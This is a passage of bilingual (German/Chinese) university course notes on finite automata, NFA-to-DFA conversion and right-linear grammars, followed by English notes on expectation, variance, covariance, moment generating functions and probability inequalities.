$\\hat{\\delta} : Q \\times \\Sigma^* \\rightarrow Q$ induktiv definiert ist durch:\\begin{aligned}\\hat{\\delta}(q, \\varepsilon) &= q \\\\\\hat{\\delta}(q, aw) &= \\hat{\\delta}(\\delta(q, a), w) \\quad \\text{für } a \\in \\Sigma,\\, w \\in \\Sigma^*.\\end{aligned}( $\\hat{\\delta}(q, w)$ bezeichnet den Zustand, den man aus $q$ mit $w$ erreicht. )Eine Sprache ist regulär gdw. sie von einem DFA akzeptiert wird. 可以这样理解$\\hat{\\delta}$：第一个参数是起始状况（Zustand），然后第二个参数的一连串的路径（或者说是操作），会依次触发/经过。 所以 L(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},里的元素翻译一下就是：所有从起点到终点的路径/操作序列。 所有endliche Automaten都可以用gerichtete und makierte Zustandsgraph表示出来，其中 点（Knoten）代表Zustände； 线（Kanten）表示Übergänge $p \\xrightarrow{a} q$ ，即$\\delta(p,a)= q$； Anfangszustand 会被用一个箭头（Pfeil）标记出来； Endzustände 会被用doppelte Kreise标记出来。 例子： $Q = \\{0,1,2\\}$ $\\Sigma = \\{a,b\\}$ 不难注意到，在这里例子里，所有可以被akzeptiert的Wort都一定包含ab。（相当于必经之路） 同样，所有包含ab的Wort也一定会被akzeptiert。 例子： 我们用#w表示w的二进制。（比如说#100=4） 不难发现，DFA akzeptiert $w \\in \\{0,1\\}^*$当且仅当#w是偶数。 证明： 假设$w \\neq \\varepsilon$，可以通过 \\hat{\\delta}(0, w0) = \\delta(\\hat{\\delta}(0, w), 0) = 0 \\in F \\hat{\\delta}(0, w1) = \\delta(\\hat{\\delta}(0, w), 1) = 1 \\notin F可以得到 w0 \\in L(A), w1 \\notin L(A)即$w \\in L(A) \\Leftrightarrow w\\text{为偶数}$。（也就是二进制的最低位等于0） 如果$w = \\varepsilon$，有$\\hat{\\delta}(0, \\varepsilon) = 0$，所以$\\varepsilon \\in L(A)$。（注意 #$\\varepsilon = 0$）$\\square$ Von rechtslinearen Grammatiken zu DFA (und zurück)Rechtslineare Grammatik（即Typ3）指的是所有Produktion都长这样：$A \\to a$ 或者$A \\to aB$。 Definition:Ein nichtdeterministischer endlicher Automat (nondeterministic finite automaton, NFA) ist ein 5-Tupel$N = (Q, \\Sigma, \\delta, q_0, F)$, so dass$Q$, $\\Sigma$, $q_0$ und $F$ sind wie bei einem DFA $\\delta : Q \\times \\Sigma \\rightarrow \\mathcal{P}(Q)$ $\\mathcal{P}(Q)$ = Menge aller Teilmengen von $Q$ Alternative: Relation $\\delta \\subseteq Q \\times \\Sigma \\times Q$ 注意，在DFA里，每一个状态（Zustand）以及一个Übergang只对应一个状态（Zustand）。而在NFA里，一个状态（Zustand）以及一个Übergang可以对应多个状态。 例子： 每一个点可能会拥有多条相同名字的边，所以结果是不确定的。（nichtdeterministisch ） 当我们输入$0111$，可能会得到多个Zustandsfolgen： p,p,p,p,p, \\ \\ \\ p,p,p,p,q \\ \\ \\ p,p,p,q,r和之前类似，我们可以在$\\delta$的基础上定义 \\begin{align*} \\bar{\\delta}: \\mathcal{P}(Q) \\times \\Sigma &\\to \\mathcal{P}(Q) \\\\ \\bar{\\delta}(S,a) :&= \\bigcup_{q \\in S} \\delta(q, a) \\end{align*}并在这个基础上像之前一样inductive定义 \\hat{\\bar{\\delta}} : \\mathcal{P}(Q) \\times \\Sigma^* \\rightarrow \\mathcal{P}(Q)而$\\hat{\\delta}(S, w)$ 可以理解成是Menge aller Zustände, die sich von einem Zustand in $S$ aus mit $w$ erreichen lassen. 例子： \\begin{aligned} \\hat{\\bar{\\delta}}(\\{p,q\\},10) &= \\hat{\\bar{\\delta}}(\\bar{\\delta}(\\{p, q\\}, 1), 0) \\\\ &= \\hat{\\bar{\\delta}}(\\delta(p, 1) \\cup \\delta(q, 1), 0) \\\\ &= \\hat{\\bar{\\delta}}(\\{p, q, r\\}, 0) \\\\ &= \\bar{\\delta}(\\{p, q, r\\}, 0) \\\\ &= \\delta(p, 0) \\cup \\delta(q, 0) \\cup \\delta(r, 0) \\\\ &= \\{p\\} \\cup \\{r\\} \\cup \\emptyset \\\\ &= \\{p, r\\} \\end{aligned}也就是说从$p,q$出发，进行一遍$10$的操作，最后一定会落在$p,r$。 Definition:Die von $N = (Q, \\Sigma, \\delta, q_0, F)$ akzeptierte Sprache ist:L(N) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(\\{q_0\\}, w) \\cap F \\neq \\emptyset \\} 注意，在DFA定义的akzeptierte Sprache里，是 L(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},而在这里，由于$\\hat{\\delta}(q_0, w)$ 是几个集合，所以我们要求的是它和$F$的交集不为空，也就是说只要存在到达的可能性那就会被akzeptiert。 为了方便，我们后续一般还是用$\\delta$ 指代$\\bar{\\delta}$ ， $\\hat{\\delta}$ 指代$\\hat{\\bar{\\delta}}$ 。 Theorem:Für jede rechtslineare Grammatik $G$ gibt es einen NFA $N$ mit L(G) = L(N) 主要的构造（证明）思路就是将Grammatik里的Variablen （V）构造成NFA的Zustände（Q），然后将Grammatik的Produktion构造成NFA里的Übergänge。 我们来看一下针对下面这个比较allgemein的例子的具体构造。 例子： \\begin{aligned} S &\\rightarrow aX \\mid aY \\\\ X &\\rightarrow aX \\mid bY \\mid a \\\\ Y &\\rightarrow aS \\mid bX \\mid aY \\mid b \\end{aligned}证明（构造）： Sei $G = (V, \\Sigma, P, S)$ eine rechtslineare Grammatik ohne die Produktion $S \\rightarrow \\varepsilon$.Definiere den NFA $A = (Q, \\Sigma, \\delta, q_0, F)$ mit: $Q = V \\cup \\{q_f\\}$ (wobei $q_f \\notin V$) $Y \\in \\delta(X, a)$ gdw $(X \\rightarrow aY) \\in P$ $q_f \\in \\delta(X, a)$ gdw $(X \\rightarrow a) \\in P$ $q_0 = S$ $F = \\{q_f\\}$ Es gilt: $a_1 \\ldots a_n \\in L(G)$ – gdw es existieren Variablen $X_1, \\ldots, X_{n-1}$ S \\rightarrow a_1X_1 \\rightarrow_G a_1a_2X_2 \\rightarrow_G \\cdots \\rightarrow_G a_1 \\ldots a_{n-1}X_{n-1} \\rightarrow_G a_1 \\ldots a_n– gdw es existieren Zustände $X_1, \\ldots, X_{n-1}$ \\delta(S, a_1) \\ni X_1,\\quad \\delta(X_1, a_2) \\ni X_2,\\quad \\ldots,\\quad \\delta(X_{n-1}, a_n) \\ni q_F– gdw $a_1 \\ldots a_n \\in L(A)$ . $\\square$ 假设这个Grammatik还包含了$S \\to \\varepsilon$，那么需要将$F$构造成$F= \\{S, q_f\\}$。 Theorem:Für jeden NFA $N$ gibt es einen DFA $M$ mit L(N) = L(M) 证明： Sei $N = (Q, \\Sigma, \\delta, q_0, F)$ ein NFA.Definiere den DFA $M = (\\mathcal{P}(Q), \\Sigma, \\bar{\\delta}, \\{q_0\\}, F_M)$: F_M := \\{ S \\subseteq Q \\mid S \\cap F \\neq \\emptyset \\}Dann gilt: \\begin{aligned} w \\in L(N) &\\Leftrightarrow \\hat{\\bar{\\delta}}(\\{q_0\\}, w) \\cap F \\neq \\emptyset &\\text{Def.} \\\\ &\\Leftrightarrow \\hat{\\bar{\\delta}}(\\{q_0\\}, w) \\in F_M &\\text{Def.} \\\\ &\\Leftrightarrow w \\in L(M) &\\text{Def.} \\end{aligned}. $\\square$ 这种构造叫做 Potenzmengenkonstruktion 或者 Teilmengenkonstruktion。 注意，按照这个构造，如果NFA里有n个Zustände， 那对应的DFA里会有$2^n$个Zustände。很多当然是可以避免这个规格的，但是有些时候并避免不了。在这个Corollary之后我们会看一个避免不了的例子。 Corollary:Für jede rechtslineare Grammatik $G$ gibt es einen DFA $M$ mit L(G) = L(M) 例子： L_k := \\{ w \\in \\{0,1\\}^* \\mid \\text{das $k$-letzte Bit von } w \\text{ ist } 1 \\}（注意，这里是倒数第$k$位为1，不是正数。） Ein NFA für diese Sprache: Lemma:Jeder DFA $M$ mit $L(M) = L_k$ hat mindestens $2^k$ Zuständen. 证明： 我们需要做的是证明 für alle $w_1, w_2 \\in \\{0, 1\\}^k$: w_1 \\ne w_2 \\Rightarrow \\hat{\\delta}(q_0, w_1) \\ne \\hat{\\delta}(q_0, w_2)证明了这个之后，由于$\\{0, 1\\}^k$里有$2^k$个元素，那么任意一个DFA里也至少会有$2^k$个Zusände，因为对于所有的$w \\in \\{0, 1\\}^k$，$\\hat{\\delta}(q_0, w)$都是$M$里的一个Zustand。 那么我们现在开始证明这个结论，用反证法： Annahme: Es gibt $w_1, w_2 \\in \\{0, 1\\}^k$ mit $w_1 \\ne w_2$, aber $\\hat{\\delta}(q_0, w_1) = \\hat{\\delta}(q_0, w_2)$. Sei $w_1 = wa_i \\ldots a_k$ und $w_2 = wb_i \\ldots b_k$ mit $a_i \\ne b_i$ （$i$表示的是$w_1,w_2$第一个不相等的位。而前面相同的部分我们就简单记作$w$。）o.E. sei $a_i = 1$, $b_i = 0$. Es gilt einerseits: \\begin{aligned} w_1 0^{i-1} &= wa_i \\ldots a_k 0^{i-1} \\in L_k \\\\ w_2 0^{i-1} &= wb_i \\ldots b_k 0^{i-1} \\notin L_k \\end{aligned}（在$w_1,w_2$后面加上$i-1$个0，这样一来第一个的倒数第$k$位就是1，第二个的倒数第$k$位是0。） Aber es gilt auch: \\begin{aligned} \\hat{\\delta}(q_0, w_1 0^{i-1}) &= \\hat{\\delta}(\\hat{\\delta}(q_0, w_1), 0^{i-1}) \\\\ &= \\hat{\\delta}(\\hat{\\delta}(q_0, w_2), 0^{i-1}) \\quad \\text{nach der Annahme}\\\\ &= \\hat{\\delta}(q_0, w_2 0^{i-1}) \\end{aligned}但是根据$L(M)$的定义： L(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},不可能存在$a,b$满足$\\hat{\\delta}(q_0, a) = \\hat{\\delta}(q_0, b)$，但是一个在$L(M)$，一个不在。 所以说得到一个Wiederspruch. $\\square$ Theorem:Für jeden DFA $M$ gibt es eine rechtslineare Grammatik $G$ mit L(M) = L(G) 证明： Sei $M = (Q, \\Sigma, \\delta, q_0, F)$.Die Grammatik $G = (V, T, P, S)$ mit: $V = Q$, $T = \\Sigma$, $S = q_0$ $(q_1 \\rightarrow aq_2) \\in P$ gdw $\\delta(q_1, a) = q_2$ $(q_1 \\rightarrow a) \\in P$ gdw $\\delta(q_1, a) \\in F$ $(q_0 \\rightarrow \\varepsilon) \\in P$ gdw $q_0 \\in F$ ist von Typ 3 und erfüllt $L(M) = L(G)$.$\\square$ NFAs mit $\\epsilon$-ÜbergängenDefinition:Ein NFA mit $\\epsilon$-Übergängen (auch $\\varepsilon$-NFA) ist ein NFA mit einem speziellen Symbol $\\epsilon \\notin \\Sigma$ und mit\\delta : Q \\times (\\Sigma \\cup \\{\\epsilon\\}) \\rightarrow \\mathcal{P}(Q).Ein $\\epsilon$-Übergang darf ausgeführt werden, ohne dass ein Eingabezeichen gelesen wird. 注意，这里的$\\epsilon$和之前用的$\\varepsilon$是不一样的东西。 $\\epsilon$ ist ein einzelnes Symbol, $\\varepsilon$ ist das leere Wort. 例子： 这个$\\varepsilon$-NFA可以接受$\\varepsilon,00,11,…$，但不能接受$101,…$。 也就是说，这个Automat虽然读取的是$11$，但它可以先（“免费”）跳到$q_1$，然后再进行2次$1$的操作。 Lemma:Für jeden $\\epsilon$-NFA $N$ gibt es einen NFA $N’$ mit L(N) = L(N'). 证明： Sei $N = (Q, \\Sigma, \\delta, q_0, F)$ ein $\\epsilon$-NFA.Wir definieren den NFA$N’ = (Q, \\Sigma, \\delta’, q_0, F’)$ mit folgenden Definitionen für $\\delta’$ und $F’$: $\\delta’ : Q \\times \\Sigma \\rightarrow \\mathcal{P}(Q)$ \\delta'(q, a) := \\bigcup_{i \\geq 0, j \\geq 0} \\hat{\\delta}(\\{q\\}, \\epsilon^i a \\epsilon^j) Falls $N$ das leere Wort $\\varepsilon$ akzeptiert, also falls \\exists i \\geq 0 : \\hat{\\delta}(\\{q_0\\}, \\epsilon^i) \\cap F \\neq \\emptysetdann setze $F’ := F \\cup \\{q_0\\}$, sonst setze $F’ := F$.$\\square$ 例子： Reguläre Ausdrücke 正则表达式Berechenbarkeit, EntscheidbarkeitBegriffe图灵机 （Turing Maschine） 可以这样理解：机器会（依靠一个探头 read/write head）读取一条Band上的内容，然后根据当前位置进行以下操作： 调整当前位置 改写Band当前位置的值 调整探头位置（左/右/不动）","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Theoretische Informatik 理论信息学","slug":"TUM-info-课程笔记/Theoretische-Informatik-理论信息学","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Theoretische-Informatik-%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"}],"tags":[{"name":"Theoretische Informatik","slug":"Theoretische-Informatik","permalink":"https://archer-baiyi.github.io/en/tags/Theoretische-Informatik/"},{"name":"理论信息学","slug":"理论信息学","permalink":"https://archer-baiyi.github.io/en/tags/%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"}]},{"title":"概率论 Probability Theory","slug":"TUM  数学 笔记/概率统计/概率论-Probability-Theory","date":"2025-04-26T18:32:06.000Z","updated":"2025-11-27T09:28:20.337Z","comments":true,"path":"2025/04/26/TUM  数学 笔记/概率统计/概率论-Probability-Theory/","permalink":"https://archer-baiyi.github.io/en/2025/04/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/","excerpt":"概率论相关笔记","text":"BasicsDefinition: Let $I \\subseteq \\mathbb{R}$. Let $X_t : \\Omega \\to \\mathbb{R}, t\\in I$, be random variables on the same probability space $(\\Omega. \\mathcal{F}, P)$. Then $X = (X_t)_{t \\in I}$ is called a real-valued stochastic process. Expected value / Expectation / Erwartungswert / 期望Definition : Let $X$ be a random variable on a probability space $(\\Omega,\\mathcal{F},P)$. The expectation of $X$ is defined by\\mathbb{E}[X] = \\int_{\\Omega}X(\\omega)P(d\\omega). Theorem: Let $X:\\Omega \\to S$ be a random variable on a probability space $(\\Omega,\\mathcal{F},P)$ with distribution $\\mu$ and let $g:S\\to \\mathbb{R}$ be a measurable function. Then\\mathbb{E}[g(X)] = \\int_{S}g(x)\\mu(dx). Corollary: If $X$ is a discrete random variable with values in $S$, then \\mathbb{E}[g(X)] = \\sum_{x \\in S}g(x)P(X=x). Corollary: If $X$ is a discrete random variable with values in $S \\subseteq \\mathbb{R}$, then \\mathbb{E}[X] = \\sum_{x \\in S}xP(X=x).Proof: Choose $g = id_S: S \\to S \\subseteq \\mathbb{R}$.$\\square$ Corollary: If $X : \\Omega \\to \\mathbb{R}^n$ has the probability density function (Verteilungsdichte) $f$, then for every Borel-measurable function $g : \\mathbb{R}^n \\to \\mathbb{R}$, the following holds: \\mathbb{E}[g(X)] = \\int_{\\mathbb{R}^n} g(x) f(x) \\, dx. Corollary: If $X$ has values in $\\mathbb{R}$ \\mathbb{E}[X] = \\int_{\\mathbb{R}} x f(x) \\, dx. Theorem (Linearity): Let $X,Y :\\Omega \\to \\mathbb{R}$ be random variables in $\\mathcal{L}^1$. Then\\mathbb{E}[aX+bY] = a\\mathbb{E}[X] + b\\mathbb{E}[Y] \\ \\ \\text{ for all }a,b \\in \\mathbb{R} Theorem: Let$X,Y :\\Omega \\to \\mathbb{R}$be independent random variables, $g,h: \\mathbb{R} \\to \\mathbb{R}$ be Borel-measurable function with $E[|g(X)|], E[|h(Y)|] &lt; \\infty$. Then\\mathbb{E}[g(X)h(Y)] = \\mathbb{E}[g(X)] \\mathbb{E}[h(Y)]. proof: Since $X$ and $Y$ are independent, the joint distribution of $(X, Y)$ is the product of the marginal distributions $P_X \\times P_Y$. Using Fubini’s theorem, we obtain \\begin{align*} \\mathbb{E}[g(X)h(Y)] &= \\int_{\\mathbb{R}} \\int_{\\mathbb{R}} g(x)h(y) \\, P_X(dx) P_Y(dy)\\\\ &= \\left( \\int_{\\mathbb{R}} g(x) \\, P_X(dx) \\right) \\left( \\int_{\\mathbb{R}} h(y) \\, P_Y(dy) \\right) = \\mathbb{E}[g(X)] \\mathbb{E}[h(Y)]. \\end{align*}$\\square$ Corollary: Let$X,Y :\\Omega \\to \\mathbb{R}$be independent random variables in $\\mathcal{L}^1$, then \\mathbb{E}[XY] = \\mathbb{E}[X] \\mathbb{E}[Y].MomentDefinition : $E[X^n]$is called the $n^{\\text{th}}$ moment of X. Theorem:Let $X \\sim \\mathcal{N}(\\mu,\\sigma^2)$ be a random variable. Then for any non-negative integer $p$ we have:\\mathbb{E}[(X - \\mu)^p] =\\begin{cases}0 & \\text{if } p \\text{ is odd}, \\\\\\sigma^p (p - 1)!! & \\text{if } p \\text{ is even}.\\end{cases}Here, $n!!$ denotes the double factorial, that is, the product of all numbers from $n$ to 1 that have the same parity as $n$. Corollary:Let $X \\sim \\mathcal{N}(0,\\sigma^2)$ be a random variable. Then for any non-negative integer $p$ we have:\\mathbb{E}[X^p] =\\begin{cases}0 & \\text{if } p \\text{ is odd}, \\\\\\sigma^p (p - 1)!! & \\text{if } p \\text{ is even}.\\end{cases} Example: Let $X \\sim \\mathcal{N}(0,\\sigma^2)$ be a random variable, we have: $\\mathbb{E}[X^2] = \\sigma^2$ $\\mathbb{E}[X^3] = 0$ $\\mathbb{E}[X^4] = 3 \\sigma^4$ Variance / Varianz / 方差Definition: Let$X\\in \\mathcal{L}^1$. Then \\text{Var}(X) = \\mathbb{E}[(X-\\mathbb{E}(X))^2]is called the variance of$X$and \\sigma_X = \\sqrt{Var(X)}is the standard deviation of $X$. Theorem: Let$X\\in \\mathcal{L}^1$, then\\text{Var}(X) = \\mathbb{E}[X^2] - \\mathbb{E}[X]^2. proof: let $\\mu:=E[X]$. \\begin{align*} \\text{Var}(X) &= \\mathbb{E}[(X-\\mu)^2]\\\\ &= \\mathbb{E}[X^2-2\\mu X + \\mu^2]\\\\ &= \\mathbb{E}[X^2]-2\\mu E[X] + \\mu^2\\\\ &= \\mathbb{E}[X^2]- \\mu^2 \\end{align*}$\\square$ Theorem: Let $X$ be a random variable with finite expectation. For $a,b \\in \\mathbb{R}$, it holds that:\\text{Var}(aX + b) = a^2 \\text{Var}(X) proof: \\begin{align*} \\text{Var}(aX + b) &= \\mathbb{E}\\left[(aX + b - \\mathbb{E}[aX+b])^2\\right] \\\\ &= \\mathbb{E}\\left[(aX + b - (a\\mathbb{E}[X] + b))^2\\right] \\quad \\text{(by linearity)}\\\\ &= \\mathbb{E}\\left[a^2 (X - \\mathbb{E}[X])^2\\right] \\\\ &= a^2 \\text{Var}(X) \\end{align*}$\\square$ Theorem: Let $X,Y$ be independent random variables, then\\text{Var}(X + Y) = \\text{Var}(X) + \\text{Var}(Y) proof: \\begin{align*} \\text{Var}(X + Y) &= \\mathbb{E}[(X+Y)^2] - \\mathbb{E}[X+Y]^2 \\\\ &= \\mathbb{E}[X^2] + \\mathbb{E}[Y^2] - \\mathbb{E}[X]^2 - \\mathbb{E}[Y^2] \\quad \\text{(by independence)}\\\\ &= \\text{Var}(X) + \\text{Var}(Y) \\end{align*}$\\square$ Theorem:Let $X,Y$ be independent random variables, then Var(XY) = Var(X)Var(Y) + Var(X)\\mathbb{E}[Y]^2 + Var(Y)\\mathbb{E}[X]^2 Proof: \\begin{align*} Var(XY) &= \\mathbb{E}[X^2Y^2] - \\mathbb{E}[XY]^2\\\\ &=\\mathbb{E}[X^2]\\mathbb{E}[Y^2] - \\mathbb{E}[X]^2\\mathbb{E}[Y]^2\\\\ &= (Var(X) + \\mathbb{E}[X]^2)(Var(Y) + \\mathbb{E}[Y]^2) - \\mathbb{E}[X]^2\\mathbb{E}[Y]^2\\\\ &= Var(X)Var(Y) + Var(X)\\mathbb{E}[Y]^2 + Var(Y)\\mathbb{E}[X]^2 \\end{align*}. $\\square$ Covariance / 协方差Definition :For real-valued random variables$X, Y \\in L^2$, the covariance of$X$and$Y$is defined by\\text{Cov}(X, Y) = \\mathbb{E}\\Bigl[(X - \\mathbb{E}[X])(Y - \\mathbb{E}[Y])\\Bigl] Theorem:(a) $\\text{Cov}(X, X) = \\text{Var}(X)$(b) $\\text{Cov}(X, Y) = \\mathbb{E}[XY] - \\mathbb{E}[X]\\mathbb{E}[Y]$(c) If $X$ and $Y$ are independent, then $\\operatorname{Cov}(X, Y) = 0$. Proof: (a) Clear from the definition. (b) By the linearity of expectation, it follows: \\text{Cov}(X, Y) = \\mathbb{E}[XY - X\\mathbb{E}[Y] - \\mathbb{E}[X]Y + \\mathbb{E}[X]\\mathbb{E}[Y]] = \\mathbb{E}[XY] - \\mathbb{E}[X]\\mathbb{E}[Y].(c) The claim follows from $\\mathbb{E}[XY] = \\mathbb{E}[X]\\mathbb{E}[Y]$.$\\square$ Theorem: Let $X_i, Y_j \\in L^2$, $a_i, b_j \\in \\mathbb{R}$, $1 \\leq i \\leq n$, $1 \\leq j \\leq m$. Then:(a) The covariance is bilinear:\\operatorname{Cov}\\left( \\sum_{i=1}^{n} a_i X_i, \\sum_{j=1}^{m} b_j Y_j \\right) = \\sum_{i=1}^{n} \\sum_{j=1}^{m} a_i b_j \\operatorname{Cov}(X_i, Y_j)(b)\\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) = \\sum_{i=1}^{n} \\operatorname{Var}(X_i) + \\sum_{\\substack{i,j=1\\\\i \\neq j}}^{n} \\operatorname{Cov}(X_i, X_j)In particular:\\operatorname{Var}(X_1 + X_2) = \\operatorname{Var}(X_1) + \\operatorname{Var}(X_2) + 2 \\operatorname{Cov}(X_1, X_2)(c) If $X_1, \\dots, X_n$ are uncorrelated, i.e., $\\operatorname{Cov}(X_i, X_j) = 0$ for all $i \\neq j$, then:\\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) = \\sum_{i=1}^{n} \\operatorname{Var}(X_i)This holds especially if $X_1, \\dots, X_n$ are independent. Proof: (a) Since $\\operatorname{Cov}(X, Y) = \\operatorname{Cov}(Y, X)$, it suffices to show linearity in the first argument. From the linearity of expectation, it follows: \\begin{align*} \\operatorname{Cov}\\left( \\sum_{i=1}^{n} a_i X_i, Y \\right) &= \\mathbb{E}\\left[ \\left( \\sum_{i=1}^{n} a_i X_i - \\mathbb{E}\\left[ \\sum_{i=1}^{n} a_i X_i \\right] \\right)(Y - \\mathbb{E}[Y]) \\right] \\\\ &= \\mathbb{E}\\left[ \\sum_{i=1}^{n} a_i (X_i - \\mathbb{E}[X_i])(Y - \\mathbb{E}[Y]) \\right] = \\sum_{i=1}^{n} a_i \\operatorname{Cov}(X_i, Y) \\end{align*}(b) Using part (a), we get: \\begin{align*} \\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) &= \\operatorname{Cov}\\left( \\sum_{i=1}^{n} X_i, \\sum_{j=1}^{n} X_j \\right) = \\sum_{i=1}^{n} \\sum_{j=1}^{n} \\operatorname{Cov}(X_i, X_j) \\\\ &= \\sum_{i=1}^{n} \\operatorname{Var}(X_i) + \\sum_{\\substack{i,j=1\\\\i \\neq j}}^{n} \\operatorname{Cov}(X_i, X_j) \\end{align*}In the special case $n = 2$, this gives: \\operatorname{Var}(X_1 + X_2) = \\operatorname{Var}(X_1) + \\operatorname{Var}(X_2) + \\operatorname{Cov}(X_1, X_2) + \\operatorname{Cov}(X_2, X_1)(c) Follows from part (b).$\\square$ Moment generating functionDefinition: Let $X$ be a random variable such that $\\mathbb{E}[e^{tX}] &lt; \\infty$, then the moment generating function is defined as M_X(t) := \\mathbb{E}[e^{tX}].for all $t \\in \\mathbb{R}$. Theorem: Let $X \\sim N(\\mu,\\sigma^2)$, then the moment generating function exists and is equal to M_X(t) = e^{\\mu t + \\frac{\\sigma^2 t^2}{2}}.Clearly, if $X \\sim N(0,1)$, we haveM_X(t) = e^{\\frac{t^2}{2}}. Proof: Let $X \\sim N(\\mu,\\sigma^2)$, and f(x) := \\frac{1}{\\sqrt{2\\pi} \\sigma} e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}}be its density function. Then, by definition we have \\begin{align*} M_X(t) = \\mathbb{E}[e^{tX}] &= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} e^{tx} \\cdot e^{- \\frac{(x - \\mu)^2}{2\\sigma^2}}\\, dx \\\\ &= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left(tx - \\frac{(x - \\mu)^2}{2\\sigma^2} \\right)\\, dx \\end{align*}Notice that \\begin{align*} tx - \\frac{(x - \\mu)^2}{2\\sigma^2} &= tx - \\frac{1}{2\\sigma^2}(x^2 - 2\\mu x + \\mu^2) \\\\ &= tx - \\frac{x^2}{2\\sigma^2} + \\frac{\\mu x}{\\sigma^2} - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2}x^2 + \\left(t + \\frac{\\mu}{\\sigma^2}\\right)x - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ x^2 - 2\\sigma^2 \\left(t + \\frac{\\mu}{\\sigma^2}\\right)x \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ x^2 - 2(\\mu + \\sigma^2 t)x \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ x^2 - 2(\\mu + \\sigma^2 t)x + (\\mu + \\sigma^2 t)^2 - (\\mu + \\sigma^2 t)^2 \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2} \\left[ (x - \\mu - \\sigma^2 t)^2 - (\\mu + \\sigma^2 t)^2 \\right] - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} + \\frac{(\\mu + \\sigma^2 t)^2 - \\mu^2}{2\\sigma^2} \\\\ &= -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} + \\mu t + \\frac{1}{2} \\sigma^2 t^2 \\end{align*}Then we have \\begin{align*} M_X(t) &= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left( -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} + \\mu t + \\frac{1}{2} \\sigma^2 t^2 \\right)\\, dx \\\\ &=e^{\\mu t + \\frac{1}{2} \\sigma^2 t^2} \\cdot \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left( -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} \\right)\\, dx \\\\ &= e^{\\mu t + \\frac{\\sigma^2 t^2}{2}}. \\end{align*}p.s.: the calculation/proof of Gaussian integral \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left( -\\frac{(x - \\mu - \\sigma^2 t)^2}{2\\sigma^2} \\right)\\, dx = \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} e^{-\\frac{y^2}{2}}\\, dy = 1can be found here: https://archer-baiyi.github.io/2025/06/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/Probability-Distributions/#Normal-Distribution .$\\square$ Important InequalitiesTheorem (Jensen&#39;s Inequality):Let $\\varphi:\\mathbb{R} \\to \\mathbb{R}$ be convex. If $\\mathbb{E}[|X|] &lt; \\infty$, then $\\mathbb{E}[\\varphi(X)]$ is well-defined and one has \\varphi(\\mathbb{E}[X]) \\leq \\mathbb{E}[\\varphi(X)]. Corollary:1. |\\mathbb{E}[X]| \\leq \\mathbb{E}[|X|]2. for $p \\geq 1 :$|\\mathbb{E}[X]|^p \\leq \\mathbb{E}[|X|^p]3. for $1 \\leq p &lt; q :$(\\mathbb{E}[|X|^p])^{\\frac{1}{p}} \\leq (\\mathbb{E}[|X|^q])^{\\frac{1}{q}} proof: 1. take $\\varphi(x) = |x|$. 2. take $\\varphi(x) = |x|^p, p \\geq 1$. 3. Let $1 \\leq p &lt; q , \\alpha := q/p &gt; 1, Z := |X|^p$. From 2 we have \\begin{align*} &\\quad |\\mathbb{E}[Z]|^\\alpha \\leq \\mathbb{E}[|Z|^\\alpha] \\\\ \\Longleftrightarrow &\\quad |\\mathbb{E}[|X|^p]|^\\alpha \\leq \\mathbb{E}[|X|^{\\alpha p}] \\\\ \\Longleftrightarrow &\\quad |\\mathbb{E}[|X|^p]|^{\\frac{1}{p}} \\leq \\mathbb{E}[|X|^{\\alpha p}]^{\\frac{1}{\\alpha p}} \\\\ \\Longleftrightarrow &\\quad (\\mathbb{E}[|X|^p])^{\\frac{1}{p}} \\leq (\\mathbb{E}[|X|^q])^{\\frac{1}{q}} \\end{align*}$\\square$ Theorem (Markov&#39;s inequality):Let $X$ be a real-valued random variable and let $f : [0, \\infty) \\to [0, \\infty)$ be a monotonically increasing function with $f(x) &gt; 0$ for all $x &gt; 0$.Then for all $a &gt; 0$ we have:P(|X| \\geq a) \\leq \\frac{\\mathbb{E}[f(|X|)]}{f(a)}.In particular, for all $a, p &gt; 0$, it holds:P(|X| \\geq a) \\leq 